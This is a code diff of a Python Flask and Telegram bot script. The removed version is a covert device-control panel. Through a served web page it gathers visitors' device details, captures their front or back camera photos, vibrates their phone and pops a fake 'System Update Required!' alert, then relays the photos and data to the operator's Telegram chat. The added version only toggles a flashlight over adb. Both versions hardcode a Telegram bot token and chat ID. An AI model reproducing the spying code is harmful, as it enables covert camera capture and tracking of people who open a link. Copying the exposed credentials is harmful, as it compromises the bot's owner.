@@ -1,118 +1,53 @@
-import os
-import base64
-import threading
-import asyncio
-from flask import Flask, render_template, request
-from flask_socketio import SocketIO, emit
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
+from flask import Flask
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
+import subprocess
 
-# --- Configuration ---
-TELEGRAM_TOKEN = "8975474043:AAGzCf-y7KESOL22y45YUoQVQCI9mbA57L4"
-# ---------------------
-
+# Flask app
 app = Flask(__name__)
-socketio = SocketIO(app, cors_allowed_origins="*")
 
-# State management
-latest_telegram_context = {}
+# Telegram Bot Token & Chat ID
+TOKEN = "8975474043:AAGzCf-y7KESOL22y45YUoQVQCI9mbA57L4"
+CHAT_ID = "5304050102"
 
-@app.route('/')
-def index():
-    return render_template('index.html')
+# Setup updater
+updater = Updater(TOKEN, use_context=True)
+dispatcher = updater.dispatcher
 
-# --- SocketIO Handlers ---
-
-@socketio.on('device_info_report')
-def handle_device_info(data):
-    print(f"Device Info Received: {data}")
-    if 'update' in latest_telegram_context:
-        update = latest_telegram_context['update']
-        context = latest_telegram_context['context']
-        loop = latest_telegram_context['loop']
-        
-        info_text = (
-            "📱 *Device Information Received*\n\n"
-            f"🌐 *Browser:* {data.get('userAgent')[:100]}...\n"
-            f"🔋 *Battery:* {data.get('batteryLevel')} ({'Charging' if data.get('isCharging') else 'Not Charging'})\n"
-            f"🖥️ *Resolution:* {data.get('screenResolution')}\n"
-            f"📶 *Network:* {data.get('connectionType')}\n"
-            f"🌍 *Language:* {data.get('language')}"
-        )
-        
-        asyncio.run_coroutine_threadsafe(
-            context.bot.send_message(chat_id=update.effective_chat.id, text=info_text, parse_mode='Markdown'),
-            loop
-        )
-
-@socketio.on('photo_captured')
-def handle_photo(data):
-    image_data = data['image']
-    header, encoded = image_data.split(",", 1)
-    binary_data = base64.b64decode(encoded)
-    
-    with open("captured.jpg", "wb") as f:
-        f.write(binary_data)
-    
-    if 'update' in latest_telegram_context:
-        update = latest_telegram_context['update']
-        context = latest_telegram_context['context']
-        loop = latest_telegram_context['loop']
-        
-        asyncio.run_coroutine_threadsafe(
-            context.bot.send_photo(chat_id=update.effective_chat.id, photo=open("captured.jpg", "rb"), caption="📸 Captured Image"),
-            loop
-        )
-
-@socketio.on('error_log')
-def handle_error(data):
-    if 'update' in latest_telegram_context:
-        update = latest_telegram_context['update']
-        context = latest_telegram_context['context']
-        loop = latest_telegram_context['loop']
-        asyncio.run_coroutine_threadsafe(
-            context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Error: {data['message']}"),
-            loop
-        )
-
-# --- Telegram Bot Logic ---
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Save context
-    latest_telegram_context['update'] = update
-    latest_telegram_context['context'] = context
-    latest_telegram_context['loop'] = asyncio.get_event_loop()
-
+# Command to show buttons
+def start(update, context):
     keyboard = [
-        [InlineKeyboardButton("Capture Front 📸", callback_data='user'), InlineKeyboardButton("Capture Back 📸", callback_data='environment')],
-        [InlineKeyboardButton("Vibrate Phone 📳", callback_data='vibrate')],
-        [InlineKeyboardButton("Show Alert ⚠️", callback_data='alert')]
+        [InlineKeyboardButton("🔦 ON", callback_data='on')],
+        [InlineKeyboardButton("💡 OFF", callback_data='off')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text('🎮 *Remote Control Panel*', reply_markup=reply_markup, parse_mode='Markdown')
+    update.message.reply_text("Choose flashlight action:", reply_markup=reply_markup)
 
-async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# Callback for button press
+def button(update: Update, context):
     query = update.callback_query
-    await query.answer()
-    
-    # Update context
-    latest_telegram_context['update'] = update
-    latest_telegram_context['context'] = context
-    latest_telegram_context['loop'] = asyncio.get_event_loop()
+    query.answer()
+    if query.data == 'on':
+        subprocess.run(["adb", "shell", "cmd", "torch", "on"])
+        query.edit_message_text(text="Flashlight turned ON 🔦")
+    elif query.data == 'off':
+        subprocess.run(["adb", "shell", "cmd", "torch", "off"])
+        query.edit_message_text(text="Flashlight turned OFF 💡")
 
-    action = query.data
-    
-    if action in ['user', 'environment']:
-        await query.edit_message_text(text=f"⏳ Requesting {action} camera photo...")
-        socketio.emit('request_capture', {'camera': action})
-    elif action == 'vibrate':
-        await query.edit_message_text(text="📳 Sending vibration command...")
-        socketio.emit('request_vibrate', {'pattern': 1000})
-    elif action == 'alert':
-        socketio.emit('request_alert', {'message': "System Update Required!"})
-        await query.edit_message_text(text="⚠️ Alert message sent to device.")
+dispatcher.add_handler(CommandHandler("start", start))
+dispatcher.add_handler(CallbackQueryHandler(button))
 
-if __name__ == '__main__':
-    # Note: For production, use a more robust threading/async approach
-    print("Starting Web Server on http://0.0.0.0:5000")
-    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
+# Flask route to trigger bot message when link is visited
+@app.route('/trigger', methods=['GET'])
+def trigger():
+    keyboard = [
+        [InlineKeyboardButton("🔦 ON", callback_data='on')],
+        [InlineKeyboardButton("💡 OFF", callback_data='off')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    updater.bot.send_message(chat_id=CHAT_ID, text="Flashlight control:", reply_markup=reply_markup)
+    return "Bot message sent!"
+
+if __name__ == "__main__":
+    updater.start_polling()
+    app.run(port=5000)
